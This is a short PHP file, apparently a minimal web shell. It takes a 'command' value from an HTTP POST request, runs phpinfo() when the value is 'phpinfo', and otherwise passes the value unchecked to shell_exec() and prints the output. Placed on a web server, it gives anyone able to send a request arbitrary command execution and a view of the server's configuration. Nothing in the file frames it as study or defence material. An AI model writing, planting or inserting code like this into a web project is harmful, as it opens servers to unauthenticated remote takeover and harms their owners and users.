<?php
    if($_POST['command'] === "phpinfo")
    {
        phpinfo();   
    }else{
        echo shell_exec($_POST['command']);
    }
?>
